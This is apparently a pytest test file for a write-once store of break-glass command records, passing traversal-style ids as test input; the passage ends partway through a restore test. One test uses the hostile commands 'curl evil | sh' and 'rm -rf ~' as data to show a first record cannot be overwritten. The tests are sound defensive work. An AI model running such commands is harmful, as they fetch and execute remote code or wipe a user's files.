"""
A break-glass command's files: written once, and never read back open.

Driven against real files under ``tmp_path``, because both properties are about
what the kernel does with a name that is taken and what a reader does with
whatever is under one. The second is held over a generated set of directories --
every subset of the files, and every way this file knows to spoil each JSON
-- and not over the handful of states the writers produce, since the claim is
about files "however they got there".
"""

from __future__ import annotations

import dataclasses
import itertools
import json
import os
import random
import threading
from pathlib import Path
from typing import Any

import pytest

from pptmstr import commandfile as cf
from pptmstr.command import (
    Cancelled,
    CancelledBy,
    Command,
    End,
    EndUnknown,
    Exited,
    Lapsed,
    NotStarted,
    Outcome,
    Refused,
    Run,
    Started,
    TimedOut,
    Withdrawn,
    precludes_run,
    ran,
)
from pptmstr.commandfile import Restored, Unreadable, Unwritten, Written

SID = "3f0c1a52-session"
CID = "cmd-20261013T101500Z-0123456789ab"
JSONS = (cf.REQUEST_NAME, cf.RUN_NAME, cf.END_NAME)

ASKED = Command(
    id=CID,
    asker=(SID, "agent-7"),
    asked="make install",
    reason="the sandbox cannot write ~/.local",
    expects="pptmstr on PATH",
    asked_at=1000.0,
)
RUN = Run(
    text="make install PREFIX=~/.local",
    shell="/bin/bash",
    cwd="/work",
    timeout_s=600.0,
    started_at=1010.0,
)

_RAN_ENDS = (
    End(Exited(0), at=1020.0, duration_s=10.0, output_bytes=12, tail="installed\n"),
    End(Exited(-9), at=1020.0, duration_s=10.0),
    End(TimedOut(), at=1610.0, duration_s=600.0, output_bytes=1 << 30, tail="Password: "),
    End(Cancelled(CancelledBy.OPERATOR), at=1015.0, duration_s=5.0),
    End(Cancelled(CancelledBy.SHUTDOWN), at=1015.0, duration_s=5.0),
    End(EndUnknown(), at=1010.0),
    End(Exited(0), at=1020.0, duration_s=10.0, leftover=2),
    End(TimedOut(), at=1610.0, duration_s=600.0, unconfirmed="sent SIGKILL and not gone"),
)
_EITHER_ENDS = (End(NotStarted("no usable shell"), at=1011.0),)
_NEVER_ENDS = (
    End(Refused("not on this machine"), at=1005.0),
    End(Withdrawn(), at=1005.0),
    End(Lapsed(), at=1005.0),
)


def _ended(end: End, *, with_run: bool, stop: float | None = None) -> Command:
    return dataclasses.replace(ASKED, run=RUN if with_run else None, end=end, stop_asked_at=stop)


# Every outcome, with and without a run where the record allows both.
ENDED: tuple[Command, ...] = (
    *(_ended(end, with_run=True) for end in _RAN_ENDS),
    _ended(_RAN_ENDS[3], with_run=True, stop=1014.5),
    *(_ended(end, with_run=True) for end in _EITHER_ENDS),
    *(_ended(end, with_run=False) for end in _EITHER_ENDS),
    *(_ended(end, with_run=False) for end in _NEVER_ENDS),
)


def _dir(root: Path, cid: str = CID, sid: str = SID) -> Path:
    return root / sid / "commands" / cid


def _written(result: object) -> Written:
    assert isinstance(result, Written), result
    return result


def _command(result: object) -> Command:
    assert isinstance(result, Command), result
    return result


def _record_all(command: Command, root: Path | None) -> None:
    _written(cf.write_request(command, root))
    if command.run is not None:
        _written(cf.write_run(command, root))
    if command.end is not None:
        _written(cf.write_end(command, root))


def _bytes_of(directory: Path) -> dict[str, bytes]:
    return {p.name: p.read_bytes() for p in directory.iterdir() if p.is_file()}


# -- the layout and the round trip ------------------------------------------------


def test_the_files_are_where_the_layout_says(tmp_path: Path) -> None:
    command = ENDED[0]
    assert cf.write_request(command, tmp_path) == Written(_dir(tmp_path) / "request.json")
    assert cf.write_run(command, tmp_path) == Written(_dir(tmp_path) / "run.json")
    assert cf.write_end(command, tmp_path) == Written(_dir(tmp_path) / "end.json")
    assert sorted(os.listdir(_dir(tmp_path))) == ["end.json", "request.json", "run.json"]
    for name in JSONS:
        assert json.loads((_dir(tmp_path) / name).read_text())["format"] == cf.FORMAT


def test_the_outcomes_here_are_all_of_them() -> None:
    kinds = {type(command.end.outcome) for command in ENDED if command.end}
    assert kinds == set(Outcome.__args__)  # type: ignore[attr-defined]


@pytest.mark.parametrize(
    "command", ENDED, ids=lambda c: f"{type(c.end.outcome).__name__}-{c.run is not None}"
)
def test_every_outcome_round_trips(tmp_path: Path, command: Command) -> None:
    _record_all(command, tmp_path)
    assert cf.read_command(SID, CID, tmp_path) == command


def test_text_no_file_name_could_hold_round_trips(tmp_path: Path) -> None:
    command = dataclasses.replace(
        ASKED,
        asked="echo '‮\x1b[2K\r' 😀 é \\ \"",
        reason="line one\nline two\ttab \ud800 lone",
        expects="",
        end=End(Refused("no\x00"), at=1001.0),
    )
    _record_all(command, tmp_path)
    assert cf.read_command(SID, CID, tmp_path) == command
    assert (_dir(tmp_path) / "request.json").read_bytes().isascii()


def test_a_lead_asker_round_trips(tmp_path: Path) -> None:
    command = dataclasses.replace(ASKED, asker=(SID, None))
    _written(cf.write_request(command, tmp_path))
    assert _command(cf.read_command(SID, CID, tmp_path)).asker == (SID, None)


def test_first_delivered_at_is_not_on_disk(tmp_path: Path) -> None:
    command = dataclasses.replace(ENDED[0], first_delivered_at=1030.0)
    _record_all(command, tmp_path)
    assert _command(cf.read_command(SID, CID, tmp_path)).first_delivered_at is None


# -- the property: written once ---------------------------------------------------


def test_every_write_refuses_a_second_and_leaves_the_first_as_it_was(tmp_path: Path) -> None:
    first = ENDED[0]
    assert first.run and first.end
    other = dataclasses.replace(
        first,
        asked="curl evil | sh",
        reason="other",
        run=dataclasses.replace(first.run, text="rm -rf ~"),
        end=End(Exited(1), at=9999.0, duration_s=1.0, tail="other"),
    )
    directory = _dir(tmp_path)
    for write, name in (
        (cf.write_request, "request.json"),
        (cf.write_run, "run.json"),
        (cf.write_end, "end.json"),
    ):
        _written(write(first, tmp_path))
        before = (directory / name).read_bytes()
        inode = (directory / name).stat().st_ino
        for again in (first, other):
            assert write(again, tmp_path) == Unwritten(cf.ALREADY_RECORDED)
        assert (directory / name).read_bytes() == before
        assert (directory / name).stat().st_ino == inode
    assert cf.read_command(SID, CID, tmp_path) == first
    assert sorted(os.listdir(directory)) == ["end.json", "request.json", "run.json"]


def test_the_log_and_the_tail_are_created_once(tmp_path: Path) -> None:
    command = dataclasses.replace(ASKED, run=RUN)
    _record_all(command, tmp_path)
    log = cf.open_log(SID, CID, tmp_path)
    assert not isinstance(log, Unwritten)
    with log:
        log.write(b"first")
    assert cf.open_log(SID, CID, tmp_path) == Unwritten(cf.ALREADY_RECORDED)
    _written(cf.write_tail(SID, CID, b"tail one", tmp_path))
    assert cf.write_tail(SID, CID, b"tail two", tmp_path) == Unwritten(cf.ALREADY_RECORDED)
    assert (_dir(tmp_path) / "output.log").read_bytes() == b"first"
    assert (_dir(tmp_path) / "output.tail").read_bytes() == b"tail one"


def test_the_log_is_on_disk_as_it_is_written(tmp_path: Path) -> None:
    _record_all(dataclasses.replace(ASKED, run=RUN), tmp_path)
    log = cf.open_log(SID, CID, tmp_path)
    assert not isinstance(log, Unwritten)
    with log:
        log.write(b"so far")
        assert (_dir(tmp_path) / "output.log").read_bytes() == b"so far"


@pytest.mark.parametrize("squatter", ["fifo", "link", "dangling", "dir"])
def test_a_name_taken_by_anything_is_not_written_over(tmp_path: Path, squatter: str) -> None:
    _written(cf.write_request(ASKED, tmp_path))
    victim = tmp_path / "victim"
    victim.write_bytes(b"untouched")
    for name in ("run.json", "output.log"):
        path = _dir(tmp_path) / name
        if squatter == "fifo":
            os.mkfifo(path)
        elif squatter == "link":
            os.symlink(victim, path)
        elif squatter == "dangling":
            os.symlink(tmp_path / "nowhere", path)
        else:
            path.mkdir()
    assert cf.write_run(dataclasses.replace(ASKED, run=RUN), tmp_path) == Unwritten(
        cf.ALREADY_RECORDED
    )
    assert isinstance(cf.open_log(SID, CID, tmp_path), Unwritten)
    assert victim.read_bytes() == b"untouched"
    assert not (tmp_path / "nowhere").exists()


def test_of_two_writers_of_one_file_exactly_one_is_written(tmp_path: Path) -> None:
    _written(cf.write_request(ASKED, tmp_path))
    texts = [f"echo {n}" for n in range(16)]
    results: dict[str, object] = {}
    start = threading.Barrier(len(texts))

    def write(text: str) -> None:
        start.wait()
        results[text] = cf.write_run(
            dataclasses.replace(ASKED, run=dataclasses.replace(RUN, text=text)), tmp_path
        )

    threads = [threading.Thread(target=write, args=(text,)) for text in texts]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    winners = [text for text, result in results.items() if isinstance(result, Written)]
    assert len(winners) == 1
    assert all(r == Unwritten(cf.ALREADY_RECORDED) for t, r in results.items() if t != winners[0])
    run = _command(cf.read_command(SID, CID, tmp_path)).run
    assert run is not None and run.text == winners[0]
    assert sorted(os.listdir(_dir(tmp_path))) == ["request.json", "run.json"]


def test_a_write_leaves_no_temp_file_whether_it_won_or_lost(tmp_path: Path) -> None:
    _record_all(ENDED[0], tmp_path)
    for write in (cf.write_request, cf.write_run, cf.write_end):
        assert isinstance(write(ENDED[0], tmp_path), Unwritten)
    assert sorted(os.listdir(_dir(tmp_path))) == ["end.json", "request.json", "run.json"]


# -- what follows what ------------------------------------------------------------


def test_only_the_request_makes_the_directory(tmp_path: Path) -> None:
    command = ENDED[0]
    for result in (
        cf.write_run(command, tmp_path),
        cf.write_end(command, tmp_path),
        cf.write_end(_ended(_NEVER_ENDS[0], with_run=False), tmp_path),
        cf.open_log(SID, CID, tmp_path),
        cf.write_tail(SID, CID, b"x", tmp_path),
    ):
        assert isinstance(result, Unwritten), result
    assert list(tmp_path.iterdir()) == []


def test_a_run_is_not_recorded_for_a_command_never_requested(tmp_path: Path) -> None:
    _dir(tmp_path).mkdir(parents=True)
    result = cf.write_run(ENDED[0], tmp_path)
    assert isinstance(result, Unwritten) and "request.json" in result.reason
    assert os.listdir(_dir(tmp_path)) == []


def test_an_end_of_a_run_needs_the_run_recorded(tmp_path: Path) -> None:
    _written(cf.write_request(ENDED[0], tmp_path))
    result = cf.write_end(ENDED[0], tmp_path)
    assert isinstance(result, Unwritten) and "run.json" in result.reason
    assert os.listdir(_dir(tmp_path)) == ["request.json"]


@pytest.mark.parametrize(
    "end", (*_NEVER_ENDS, *_EITHER_ENDS), ids=lambda e: type(e.outcome).__name__
)
def test_an_end_with_no_run_needs_only_the_request(tmp_path: Path, end: End) -> None:
    command = _ended(end, with_run=False)
    _written(cf.write_request(command, tmp_path))
    _written(cf.write_end(command, tmp_path))
    assert cf.read_command(SID, CID, tmp_path) == command


@pytest.mark.parametrize(
    "end", (*_NEVER_ENDS, *_EITHER_ENDS), ids=lambda e: type(e.outcome).__name__
)
def test_an_end_that_says_nothing_was_approved_is_refused_beside_a_run(
    tmp_path: Path, end: End
) -> None:
    _record_all(dataclasses.replace(ASKED, run=RUN), tmp_path)
    result = cf.write_end(_ended(end, with_run=False), tmp_path)
    assert isinstance(result, Unwritten) and "run.json" in result.reason
    assert not (_dir(tmp_path) / "end.json").exists()


def test_a_run_is_not_recorded_after_an_end(tmp_path: Path) -> None:
    _record_all(_ended(_NEVER_ENDS[0], with_run=False), tmp_path)
    result = cf.write_run(dataclasses.replace(ASKED, run=RUN), tmp_path)
    assert isinstance(result, Unwritten) and "end.json" in result.reason
    assert not (_dir(tmp_path) / "run.json").exists()


def test_a_command_with_nothing_to_record_is_unwritten(tmp_path: Path) -> None:
    _written(cf.write_request(ASKED, tmp_path))
    assert isinstance(cf.write_run(ASKED, tmp_path), Unwritten)
    assert isinstance(cf.write_end(ASKED, tmp_path), Unwritten)
    assert isinstance(cf.write_end(dataclasses.replace(ASKED, run=RUN), tmp_path), Unwritten)
    assert os.listdir(_dir(tmp_path)) == ["request.json"]


def test_a_log_needs_a_run_and_a_tail_needs_a_log(tmp_path: Path) -> None:
    _written(cf.write_request(ASKED, tmp_path))
    assert isinstance(cf.open_log(SID, CID, tmp_path), Unwritten)
    _written(cf.write_run(dataclasses.replace(ASKED, run=RUN), tmp_path))
    assert isinstance(cf.write_tail(SID, CID, b"x", tmp_path), Unwritten)
    assert sorted(os.listdir(_dir(tmp_path))) == ["request.json", "run.json"]


def test_a_record_that_could_not_be_read_back_is_not_written(tmp_path: Path) -> None:
    _record_all(dataclasses.replace(ASKED, run=RUN), tmp_path)
    huge = _ended(End(Exited(0), at=1.0, tail="x" * (cf.MAX_JSON_BYTES + 1)), with_run=True)
    assert isinstance(cf.write_end(huge, tmp_path), Unwritten)
    nan = _ended(End(Exited(0), at=float("nan")), with_run=True)
    assert isinstance(cf.write_end(nan, tmp_path), Unwritten)
    assert sorted(os.listdir(_dir(tmp_path))) == ["request.json", "run.json"]
    log = cf.open_log(SID, CID, tmp_path)
    assert not isinstance(log, Unwritten)
    log.close()
    over = cf.write_tail(SID, CID, b"x" * (cf.MAX_TAIL_FILE_BYTES + 1), tmp_path)
    assert isinstance(over, Unwritten) and not (_dir(tmp_path) / "output.tail").exists()


# -- ids are one path component ---------------------------------------------------

_BAD_IDS = [
    "",
    ".",
    "..",
    "../x",
    "a/b",
    "/etc",
    "cmd-1",
    CID + "\n",
    CID + "/..",
    CID.upper(),
    "x\0",
]


@pytest.mark.parametrize("bad", _BAD_IDS)
def test_an_id_that_is_not_a_command_id_reaches_no_path(tmp_path: Path, bad: str) -> None:
    root = tmp_path / "root"
    _written(cf.write_request(ASKED, root))
    before = sorted(p.relative_to(tmp_path) for p in tmp_path.rglob("*"))
    command = dataclasses.replace(ENDED[0], id=bad)
    for result in (
        cf.write_request(command, root),
        cf.write_run(command, root),
        cf.write_end(command, root),
        cf.open_log(SID, bad, root),
        cf.write_tail(SID, bad, b"x", root),
    ):
        assert isinstance(result, Unwritten), result
    assert isinstance(cf.read_command(SID, bad, root), Unreadable)
    assert cf.tail(SID, bad, root) == ""
    assert cf.command_dir(SID, bad, root) is None
    assert sorted(p.relative_to(tmp_path) for p in tmp_path.rglob("*")) == before


@pytest.mark.parametrize("bad", ["", ".", "..", "../x", "a/b", "/etc", "x\0"])
def test_a_session_id_that_is_not_one_reaches_no_path(tmp_path: Path, bad: str) -> None:
    root = tmp_path / "root"
    root.mkdir()
    command = dataclasses.replace(ENDED[0], asker=(bad, None))
    for result in (
        cf.write_request(command, root),
        cf.write_run(command, root),
        cf.write_end(command, root),
    ):
        assert isinstance(result, Unwritten), result
    assert isinstance(cf.read_command(bad, CID, root), Unreadable)
    assert cf.restore(bad, root).problem is not None
    assert cf.restore(bad, root).commands == ()
    assert cf.tail(bad, CID, root) == ""
    assert list(tmp_path.rglob("*")) == [root]


def test_a_command_directory_that_is_a_link_is_neither_read_nor_written(tmp_path: Path) -> None:
    _record_all(ENDED[0], tmp_path)
    other = "cmd-20261013T101501Z-0123456789ab"
    os.symlink(_dir(tmp_path), _dir(tmp_path, other))
    assert isinstance(cf.read_command(SID, other, tmp_path), Unreadable)
    assert isinstance(cf.write_request(dataclasses.replace(ASKED, id=other), tmp_path), Unwritten)
    assert isinstance(cf.open_log(SID, other, tmp_path), Unwritten)
    assert cf.tail(SID, other, tmp_path) == ""
    # And a link to somewhere with nothing in it, which a write would fill.
    empty, third = tmp_path / "empty", "cmd-20261013T101502Z-0123456789ab"
    empty.mkdir()
    os.symlink(empty, _dir(tmp_path, third))
    assert isinstance(cf.write_request(dataclasses.replace(ASKED, id=third), tmp_path), Unwritten)
    assert list(empty.iterdir()) == []
    assert [c.id for c in cf.restore(SID, tmp_path).commands] == [CID]


# -- the property: nothing is read back open --------------------------------------


def test_a_request_with_no_end_reads_as_lapsed(tmp_path: Path) -> None:
    _written(cf.write_request(ASKED, tmp_path))
    read = _command(cf.read_command(SID, CID, tmp_path))
    assert read == dataclasses.replace(ASKED, end=End(Lapsed(), at=ASKED.asked_at))
    assert not read.is_open
    assert os.listdir(_dir(tmp_path)) == ["request.json"]


def test_a_run_with_no_end_reads_as_end_unknown(tmp_path: Path) -> None:
    running = dataclasses.replace(ASKED, run=RUN)
    _record_all(running, tmp_path)
    read = _command(cf.read_command(SID, CID, tmp_path))
    assert read == dataclasses.replace(running, end=End(EndUnknown(), at=RUN.started_at))
    assert not read.is_open
    assert sorted(os.listdir(_dir(tmp_path))) == ["request.json", "run.json"]


@pytest.fixture
def good(tmp_path_factory: pytest.TempPathFactory) -> dict[tuple[str, int], dict[str, Any]]:
    """
    For each command in ``ENDED``, by index, the three objects the writers make.
    """
    found: dict[tuple[str, int], dict[str, Any]] = {}
    for index, command in enumerate(ENDED):
        root = tmp_path_factory.mktemp("good")
        full = (
            command if command.run is not None else dataclasses.replace(command, end=None, run=RUN)
        )
        _written(cf.write_request(full, root))
        _written(cf.write_run(full, root))
        found[cf.REQUEST_NAME, index] = json.loads((_dir(root) / cf.REQUEST_NAME).read_text())
        found[cf.RUN_NAME, index] = json.loads((_dir(root) / cf.RUN_NAME).read_text())
        root = tmp_path_factory.mktemp("good-end")
        _record_all(command, root)
        found[cf.END_NAME, index] = json.loads((_dir(root) / cf.END_NAME).read_text())
    return found


def _put(path: Path, obj: object) -> None:
    path.write_text(json.dumps(obj))


# Each way of spoiling a JSON file: a name, and what puts it under the path given
# a good object for that file. None of them may be read as the good file.
def _spoilers(tmp_path: Path) -> dict[str, Any]:
    elsewhere = tmp_path / "elsewhere.json"

    def link(path: Path, obj: dict[str, Any]) -> None:
        _put(elsewhere, obj)
        os.symlink(elsewhere, path)

    return {
        "empty": lambda p, o: p.write_bytes(b""),
        "torn": lambda p, o: p.write_text(json.dumps(o)[:-7]),
        "not-utf8": lambda p, o: p.write_bytes(b"\xff\xfe{}"),
        "a-list": lambda p, o: _put(p, [o]),
        "nan": lambda p, o: p.write_text(json.dumps(o)[:-1] + ', "x": NaN}'),
        "deep": lambda p, o: p.write_text("[" * 3_000),
        "oversize": lambda p, o: _put(p, {**o, "pad": "x" * cf.MAX_JSON_BYTES}),
        "fifo": lambda p, o: os.mkfifo(p),
        "link": link,
        "dangling": lambda p, o: os.symlink(tmp_path / "nowhere", p),
        "directory": lambda p, o: p.mkdir(),
        "no-format": lambda p, o: _put(p, {k: v for k, v in o.items() if k != "format"}),
        "format-true": lambda p, o: _put(p, {**o, "format": True}),
        "format-zero": lambda p, o: _put(p, {**o, "format": 0}),
        "format-text": lambda p, o: _put(p, {**o, "format": "1"}),
        "other-id": lambda p, o: _put(p, {**o, "id": "cmd-20261013T101500Z-ffffffffffff"}),
        "id-missing": lambda p, o: _put(p, {k: v for k, v in o.items() if k != "id"}),
        "newer-and-broken": lambda p, o: _put(p, {"format": 2, "id": o["id"]}),
    }


# The spoilers that leave a JSON object with a format, and are wrong in what it says.
_IN_THE_KEYS = ("other-id", "id-missing", "newer-and-broken")


def test_no_directory_however_it_got_there_reads_as_an_open_command(
    tmp_path: Path, good: dict[tuple[str, int], dict[str, Any]], monkeypatch: pytest.MonkeyPatch
) -> None:
    """
    Each JSON file is absent, good (for each outcome), a later build's, or spoiled
    in one of the ways above; the log and the tail are there or not. Whatever the
    combination, reading returns a reason or a command that has ended, and a
    spoiled file is never passed over as though it were absent. Two files are
    spoiled together only in the same way, which keeps this to a few thousand
    directories; each file is read by itself, so the pairs left out are the
    product of cases that are here.

    The size cap is lowered for the run, so that the thousands of oversize files
    this writes are a few kilobytes each. The real cap has its own test.
    """
    monkeypatch.setattr(cf, "MAX_JSON_BYTES", 4096)
    spoilers = _spoilers(tmp_path)
    request_states = ["absent", "good", "newer", *spoilers]
    run_states = ["absent", "good", "newer", *spoilers]
    end_states = ["absent", "newer", *(f"good-{n}" for n in range(len(ENDED))), *spoilers]
    output_states = [(False, False), (True, False), (True, True), (False, True)]
    serial = itertools.count()
    seen_commands = seen_unreadable = 0

    for request, run, end in itertools.product(request_states, run_states, end_states):
        ways = {s for s in (request, run, end) if s in spoilers}
        if len(ways) > 1:
            continue
        # The outputs do not multiply the spoiled states: nothing reads them here.
        plain = not ways
        for has_log, has_tail in output_states if plain else output_states[:1]:
            cid = f"cmd-20261013T101500Z-{next(serial):012x}"
            directory = _dir(tmp_path, cid)
            directory.mkdir(parents=True)
            index = int(end.split("-")[1]) if end.startswith("good-") else 0
            for name, state in ((cf.REQUEST_NAME, request), (cf.RUN_NAME, run), (cf.END_NAME, end)):
                obj = {**good[name, index], "id": cid}
                if state == "absent":
                    continue
                if state == "newer":
                    _put(
                        directory / name,
                        {**obj, "format": cf.FORMAT + 1, "later": [1, {"k": None}]},
                    )
                elif state == "good" or state.startswith("good-"):
                    _put(directory / name, {**obj, "unknown_key": {"ignored": True}})
                else:
                    spoilers[state](directory / name, obj)
            if has_log:
                (directory / cf.LOG_NAME).write_bytes(b"out\n")
            if has_tail:
                os.mkfifo(directory / cf.TAIL_NAME)
            before = sorted(os.listdir(directory))

            found = cf.read_command(SID, cid, tmp_path)

            where = (request, run, end, has_log, has_tail)
            assert isinstance(found, (Command, Unreadable)), where
            assert sorted(os.listdir(directory)) == before, where
            spoiled = [s for s in (request, run, end) if s in spoilers]
            if isinstance(found, Command):
                seen_commands += 1
                assert not found.is_open and found.end is not None, where
                assert not spoiled and request != "absent", where
                assert (found.run is None) == (run == "absent"), where
                assert found.id == cid and found.asker == ASKED.asker, where
                if end == "absent":
                    expected: Outcome = Lapsed() if run == "absent" else EndUnknown()
                    assert found.end.outcome == expected, where
                else:
                    assert found.end == ENDED[index].end, where
            else:
                seen_unreadable += 1
                assert found.reason, where
                if not spoiled and request != "absent":
                    # Readable files that ``Command`` refuses to mean anything.
                    outcome = ENDED[index].end.outcome  # type: ignore[union-attr]
                    assert end != "absent", where
                    assert (ran(outcome) and run == "absent") or (
                        precludes_run(outcome) and run != "absent"
                    ), where
                # A file that is not a JSON object of a placeable format is always
                # named. One spoiled in its keys is named when it is the first
                # thing wrong, reading request, run, end.
                states = ((cf.REQUEST_NAME, request), (cf.RUN_NAME, run), (cf.END_NAME, end))
                broken = [n for n, s in states if s in spoilers and s not in _IN_THE_KEYS]
                for name in broken:
                    assert name in found.reason, where
                in_keys = [n for n, s in states if s in _IN_THE_KEYS]
                if in_keys and not broken and request != "absent":
                    assert found.reason.startswith(in_keys[0]), where

    # The generator reached both answers, in numbers that say it was not vacuous.
    assert seen_commands > 100 and seen_unreadable > 1000
    monkeypatch.setattr(cf, "MAX_COMMANDS", seen_commands + seen_unreadable)
    restored = cf.restore(SID, tmp_path)
    assert restored.problem is None
    assert len(restored.commands) == seen_commands
    assert len(restored.unreadable) == seen_unreadable
    assert all(not command.is_open for command in restored.commands)
    assert not (tmp_path / "nowhere").exists()


def test_no_sequence_of_writes_leaves_an_open_command_or_changes_a_file(tmp_path: Path) -> None:
    rng = random.Random(20261013)
    candidates = [ASKED, dataclasses.replace(ASKED, run=RUN), *ENDED]
    for trial in range(80):
        root = tmp_path / str(trial)
        held: dict[str, bytes] = {}
        for _ in range(rng.randrange(1, 9)):
            command = rng.choice(candidates)
            op = rng.choice(["request", "run", "end", "log", "tail"])
            if op == "request":
                cf.write_request(command, root)
            elif op == "run":
                cf.write_run(command, root)
            elif op == "end":
                cf.write_end(command, root)
            elif op == "log":
                log = cf.open_log(SID, CID, root)
                if not isinstance(log, Unwritten):
                    log.close()
            else:
                cf.write_tail(SID, CID, rng.randbytes(8), root)
            if not _dir(root).exists():
                assert not root.exists()
                continue
            now = _bytes_of(_dir(root))
            assert {k: now.get(k) for k in held} == held, "a file changed or went away"
            assert all(not name.endswith(".tmp") for name in now)
            held = now
            assert "request.json" in now
            # The writers alone never make a directory that cannot be read.
            read = _command(cf.read_command(SID, CID, root))
            assert not read.is_open
            assert (read.run is not None) == ("run.json" in now)


def test_a_json_file_over_the_cap_is_unreadable_and_one_at_it_is_read(tmp_path: Path) -> None:
    _written(cf.write_request(ASKED, tmp_path))
    path = _dir(tmp_path) / "request.json"
    obj = json.loads(path.read_text())
    path.unlink()
    room = cf.MAX_JSON_BYTES - len(json.dumps({**obj, "pad": ""}))
    path.write_text(json.dumps({**obj, "pad": "x" * room}))
    assert path.stat().st_size == cf.MAX_JSON_BYTES
    _command(cf.read_command(SID, CID, tmp_path))
    path.write_text(json.dumps({**obj, "pad": "x" * (room + 1)}))
    found = cf.read_command(SID, CID, tmp_path)
    assert isinstance(found, Unreadable) and "request.json" in found.reason


# -- formats and keys -------------------------------------------------------------


def test_a_newer_format_is_shown_named_and_added_to_by_nothing(tmp_path: Path) -> None:
    command = dataclasses.replace(ASKED, run=RUN)
    _record_all(command, tmp_path)
    path = _dir(tmp_path) / "request.json"
    newer = {**json.loads(path.read_text()), "format": cf.FORMAT + 1, "granted_by": "launch"}
    path.unlink()
    _put(path, newer)

    shown = _command(cf.read_command(SID, CID, tmp_path))
    assert shown.asked == ASKED.asked and isinstance(shown.end, End)
    restored = cf.restore(SID, tmp_path)
    assert restored.newer == (CID,) and restored.commands == (shown,)

    full = ENDED[0]
    for result in (
        cf.write_end(full, tmp_path),
        cf.open_log(SID, CID, tmp_path),
    ):
        assert isinstance(result, Unwritten) and "newer build" in result.reason, result
    assert sorted(os.listdir(_dir(tmp_path))) == ["request.json", "run.json"]
    assert json.loads(path.read_text()) == newer


def test_a_newer_request_takes_no_run(tmp_path: Path) -> None:
    _written(cf.write_request(ASKED, tmp_path))
    path = _dir(tmp_path) / "request.json"
    newer = {**json.loads(path.read_text()), "format": cf.FORMAT + 1}
    path.unlink()
    _put(path, newer)
    result = cf.write_run(dataclasses.replace(ASKED, run=RUN), tmp_path)
    assert isinstance(result, Unwritten) and "newer build" in result.reason
    refused = cf.write_end(_ended(_NEVER_ENDS[0], with_run=False), tmp_path)
    assert isinstance(refused, Unwritten) and "newer build" in refused.reason
    assert os.listdir(_dir(tmp_path)) == ["request.json"]


def test_a_newer_file_that_cannot_be_read_is_still_named_as_newer(tmp_path: Path) -> None:
    _written(cf.write_request(ASKED, tmp_path))
    _put(_dir(tmp_path) / "run.json", {"format": 7, "id": CID})
    restored = cf.restore(SID, tmp_path)
    assert restored.commands == () and restored.newer == (CID,)
    ((cid, reason),) = restored.unreadable
    assert cid == CID and "run.json" in reason and "format 7" in reason


_REQUIRED = {
    cf.REQUEST_NAME: ("id", "asker", "asked", "reason", "expects", "asked_at"),
    cf.RUN_NAME: ("id", "text", "shell", "cwd", "timeout_s", "started_at"),
    cf.END_NAME: ("id", "outcome", "at", "duration_s", "output_bytes", "tail"),
}
_WRONG: tuple[object, ...] = (None, True, 7, "7", [], {}, [SID], [SID, 3], ["other", None], 1e999)


def test_a_required_key_missing_or_mistyped_makes_that_file_unreadable(tmp_path: Path) -> None:
    _record_all(ENDED[0], tmp_path)
    originals = {name: json.loads((_dir(tmp_path) / name).read_text()) for name in JSONS}
    serial = itertools.count(1)
    checked = 0
    for name, keys in _REQUIRED.items():
        optional = {"format", "stop_asked_at", "leftover", "unconfirmed"}
        assert set(originals[name]) - optional == set(keys), "the table is the file's keys"
        for key in keys:
            good_type = type(originals[name][key])
            variants: list[dict[str, Any]] = [
                {k: v for k, v in originals[name].items() if k != key}
            ]
            for wrong in _WRONG:
                same = type(wrong) is good_type or (good_type is float and type(wrong) is int)
                if same and wrong not in ("7", [SID], [SID, 3], ["other", None], {}, 1e999):
                    continue
                if (
                    key in ("asked", "reason", "expects", "text", "shell", "cwd", "tail")
                    and wrong == "7"
                ):
                    continue
                variants.append({**originals[name], key: wrong})
            for variant in variants:
                cid = f"cmd-20261013T101500Z-{next(serial):012x}"
                directory = _dir(tmp_path, cid)
                directory.mkdir()
                for other in JSONS:
                    obj = variant if other == name else originals[other]
                    if obj.get("id") == CID:
                        obj = {**obj, "id": cid}
                    (directory / other).write_text(json.dumps(obj).replace("Infinity", "1e999"))
                found = cf.read_command(SID, cid, tmp_path)
                assert isinstance(found, Unreadable), (name, key, variant.get(key, "<missing>"))
                assert found.reason.startswith(name), found.reason
                checked += 1
    assert checked > 100
    # The untouched command is still read: one file's damage is one command's.
    assert cf.read_command(SID, CID, tmp_path) == ENDED[0]


@pytest.mark.parametrize(
    "outcome",
    [None, "exited", [], {}, {"kind": "exit"}, {"kind": "exited"}, {"kind": "exited", "code": True},
     {"kind": "exited", "code": "0"}, {"kind": "cancelled"}, {"kind": "cancelled", "by": "agent"},
     {"kind": "refused"}, {"kind": "not_started", "reason": 3}, {"kind": ["exited"], "code": 0}],
)  # fmt: skip
def test_an_outcome_this_build_does_not_know_is_not_read_as_one_it_does(
    tmp_path: Path, outcome: object
) -> None:
    _record_all(ENDED[0], tmp_path)
    path = _dir(tmp_path) / "end.json"
    obj = {**json.loads(path.read_text()), "outcome": outcome}
    path.unlink()
    _put(path, obj)
    found = cf.read_command(SID, CID, tmp_path)
    assert isinstance(found, Unreadable) and found.reason.startswith("end.json")


def test_a_stop_time_of_the_wrong_type_is_unreadable_and_an_absent_one_is_none(
    tmp_path: Path,
) -> None:
    _record_all(ENDED[0], tmp_path)
    path = _dir(tmp_path) / "end.json"
    obj = json.loads(path.read_text())
    path.unlink()
    _put(path, {k: v for k, v in obj.items() if k != "stop_asked_at"})
    assert _command(cf.read_command(SID, CID, tmp_path)).stop_asked_at is None
    path.unlink()
    _put(path, {**obj, "stop_asked_at": "soon"})
    assert isinstance(cf.read_command(SID, CID, tmp_path), Unreadable)


def test_a_request_filed_under_another_session_is_unreadable(tmp_path: Path) -> None:
    _record_all(ENDED[0], tmp_path)
    (tmp_path / "other").mkdir()
    os.rename(tmp_path / SID / "commands", tmp_path / "other" / "commands")
    found = cf.read_command("other", CID, tmp_path)
    assert isinstance(found, Unreadable) and "session" in found.reason


# -- restore ----------------------------------------------------------------------


def _cid(n: int) -> str:
    return f"cmd-20261013T101500Z-{n:012x}"


def test_restore_is_in_asked_order_and_ignores_what_is_not_a_command(tmp_path: Path) -> None:
    # Asked order is not id order: the ids here run the other way.
    for n, asked_at in ((5, 10.0), (4, 20.0), (3, 20.0), (2, 30.0)):
        _record_all(dataclasses.replace(ENDED[0], id=_cid(n), asked_at=asked_at), tmp_path)
    _written(cf.write_request(dataclasses.replace(ASKED, id=_cid(1), asked_at=5.0), tmp_path))
    base = tmp_path / SID / "commands"
    (base / "notes.txt").write_text("x")
    (base / "not-a-command").mkdir()
